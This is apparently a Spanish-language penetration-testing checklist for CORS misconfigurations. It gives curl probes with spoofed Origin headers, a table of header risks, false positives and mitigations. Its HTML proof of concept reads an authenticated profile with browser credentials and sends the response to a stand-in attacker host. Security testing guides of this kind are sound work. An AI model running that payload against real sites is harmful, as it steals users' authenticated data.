# CORS

> Técnica: revisar si la política CORS permite que orígenes no confiables lean respuestas autenticadas.

## Cuándo probar

- La API usa cookies o tokens en navegador.
- Hay cabeceras `Access-Control-Allow-Origin`.
- El servidor refleja el header `Origin`.
- Se permite `Access-Control-Allow-Credentials: true`.
- Hay endpoints con datos sensibles consumidos desde frontend.

## Variables

```bash
export API_URL="https://example.com/api"
export TOKEN="eyJhbGciOi..."
```

## Baseline

```bash
curl -i "$API_URL/users/me" \
  -H "Authorization: Bearer $TOKEN"
```

## Probar Origin arbitrario

```bash
curl -i "$API_URL/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://attacker.example"
```

## Probar subdominio falso

```bash
curl -i "$API_URL/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://example.com.attacker.example"
```

## Probar null origin

```bash
curl -i "$API_URL/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: null"
```

## Preflight

```bash
curl -i -X OPTIONS "$API_URL/users/me" \
  -H "Origin: https://attacker.example" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization, Content-Type"
```

## Qué buscar

| Cabecera | Riesgo |
|---|---|
| `Access-Control-Allow-Origin: *` | Riesgoso si se exponen datos, pero no permite credentials |
| Refleja cualquier Origin | Alto si hay credentials |
| `Access-Control-Allow-Credentials: true` | Permite cookies/autenticación en CORS |
| Permite `null` | Riesgo con contextos sandbox/file |
| Permite subdominios mal validados | Bypass de allowlist |
| Permite headers sensibles | Puede facilitar abuso |

## Vulnerable si

La combinación crítica suele ser:

```http
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
```

y el endpoint devuelve datos sensibles usando cookies o credenciales del navegador.

## PoC HTML

```html
<script>
fetch("https://example.com/api/users/me", {
  credentials: "include"
})
.then(r => r.text())
.then(d => fetch("https://attacker.example/log?d=" + encodeURIComponent(d)));
</script>
```

## Evidencia mínima

```text
Endpoint:
Origin probado:
Response headers:
Datos sensibles devueltos:
Uso de credentials:
Impacto:
```

## Falsos positivos

- `Access-Control-Allow-Origin: *` sin credentials y sin datos sensibles.
- El endpoint no devuelve información sensible.
- La autenticación no usa cookies ni credenciales del navegador.
- El navegador bloquea realmente la lectura.
- El CORS solo está abierto en endpoints públicos.

## Mitigación

- Usar allowlist estricta de origins.
- No reflejar el header `Origin` sin validación.
- Evitar `Access-Control-Allow-Credentials: true` salvo necesidad.
- No permitir `null` salvo caso controlado.
- Validar subdominios correctamente.
- Separar APIs públicas y privadas.